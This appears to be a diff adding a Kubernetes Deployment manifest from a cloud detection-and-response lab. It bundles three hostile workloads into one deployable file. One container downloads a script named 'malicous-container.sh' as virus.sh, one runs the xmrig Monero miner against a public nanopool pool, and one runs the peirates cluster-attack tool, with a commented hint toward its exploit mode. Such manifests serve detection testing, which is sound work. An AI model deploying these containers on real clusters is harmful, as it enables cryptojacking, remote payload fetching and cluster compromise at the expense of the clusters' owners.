@@ -1,0 +1,48 @@
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: cdr-minder-alpine
+  labels:
+    app: alpine
+spec:
+  replicas: 1
+  selector:
+    matchLabels:
+      app: alpine
+  template:
+    metadata:
+      labels:
+        app: alpine
+    spec:
+      restartPolicy: Always
+      containers:
+        - name: alpine
+          image: alpine:latest
+          command: ["/bin/sh", "-c"]
+          args:
+            - "wget -q https://raw.githubusercontent.com/hankthebldr/xsiam-prisma-cdr-lab/refs/heads/alpha/1.0/malicous-container/malicous-container.sh -O virus.sh && sleep 3600"
+
+        - name: xmrig
+          image: metal3d/xmrig:latest
+          args:
+            - "--url=stratum+tcp://xmr-us-east1.nanopool.org:10300"
+            - "--user=NOKEY"
+            - "--pass=x"
+          # Additional arguments can be added here if required
+
+        - name: peirates
+          image: bustakube/alpine-peirates:latest
+          command: ["/bin/sh", "-c"]
+          args:
+            - "peirates discover"
+          # If you need to run different commands:
+          # args: ["peirates", "exploit", "<some_technique>"]
+
+      # Optional: Set resource requests/limits for better control
+      # resources:
+      #   requests:
+      #     cpu: "100m"
+      #     memory: "128Mi"
+      #   limits:
+      #     cpu: "500m"
+      #     memory: "256Mi"
